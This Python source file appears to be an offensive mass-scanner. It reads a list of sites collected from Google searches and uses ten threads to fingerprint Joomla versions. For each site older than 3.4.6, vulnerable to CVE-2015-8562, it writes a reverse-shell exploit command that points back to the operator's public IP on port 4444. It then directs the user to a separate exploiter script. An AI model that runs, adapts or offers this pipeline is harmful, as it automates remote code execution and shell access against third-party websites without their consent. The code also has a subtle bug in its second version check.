import os
from lxml import html as lh
from queue import Queue
from urllib.parse import urlparse
from threading import Thread
import requests
import threading
from requests import get
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()


class Joomla_CVE_2015_8562():

    def __init__(self, filename, revshell, port):
        self.filename = filename
        self.revshell = revshell
        self.port = port
        self.urls = self.joomla_cve()

    @staticmethod
    def banner():
        os.system('clear')
        print("\n")
        print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
        print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
        print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
        print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
        print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
        print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
        print("       Joomla CVE 2015 8562 Checker - anarcoder at protonmail.com\n") 

    def remove_duplicate_targets(self):
        results = [line.rstrip('\n') for line in open(self.filename)]
        url_lists = []
        for url in results:
            try:
                urlp = urlparse(url)
                urlp = urlp.scheme + '://' + urlp.netloc
                url_lists.append(urlp)
            except:
                pass
        url_lists = set(url_lists)
        url_lists = list(url_lists)
        return url_lists

    def version(self, version):
        return tuple(map(int, (version.split("."))))

    def check_connection_target(self, q):
        while True:
            #with lock:
                try:
                    url = q.get()
                    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; '
                               'Linux x86_64; rv:41.0) Gecko/20100101 '
                               'Firefox/41.0'}
                    joomver1 = '/language/en-GB/en-GB.xml'
                    joomver2 = '/administrator/manifests/files/joomla.xml'
                    joomla_version = '90.90.90'

                    req = get(url, headers=headers, verify=False, timeout=25)
                    if req.status_code == 200 and req.url.endswith('/'):
                        # First attempt to get joomla version
                        try:
                            req2 = get(req.url + joomver1, headers=headers)
                            options = lh.fromstring(req2.content)
                            joomla_version = options.xpath(
                                '//version/text()')[0]
                            # Second attemtp to get joomla version
                            if joomla_version == '90.90.90':
                                req = get(req.url + joomver2, headers=headers)
                                options = lh.fromstring(req2.content)
                                joomla_version = options.xpath(
                                    '//version/text()')[0]
                        except:
                            # No joomla version
                            q.task_done()
                            pass
                except:
                    q.task_done()
                    pass
                if self.version(joomla_version) < self.version('3.4.6'):
                    print('[+] Target: ' + req.url)
                    print('[+] Possible vulnerable')
                    print('[+] Joomla: ' + joomla_version + '\n')
                    cmd = 'echo python2 joomla-rce-2-shell.py -t {0} -l {1} '\
                          '-p {2} >> exploits/vuln_joomla_2015_8562.txt\n'\
                          .format(req.url, self.revshell, self.port)
                    os.system(cmd)
                q.task_done()

    def joomla_cve(self):
        self.banner()

        # Removing duplicate targets
        url_lists = self.remove_duplicate_targets()
        print(len(url_lists))

        # My Queue
        q = Queue(maxsize=0)

        # Number of threads
        num_threads = 10

        for url in url_lists:
            q.put(url)

        # My threads
        print('[*] Starting evil threads =)...\n')
        for i in range(num_threads):
            worker = Thread(target=self.check_connection_target, args=(q,))
            worker.setDaemon(True)
            worker.start()

        q.join()


def main():
    filename = 'results_google_search.txt'
    req = requests.get('https://api.ipify.org/'); revshell = str(req.content,'utf-8')
    port = 4444
    Joomla_CVE_2015_8562(filename, revshell, port)
    print('[+] \033[31mThe results of this parser can be exploited '
          'by\033[33m exploits/exploiter.py\033[39m\n')


if __name__ == '__main__':
    main()
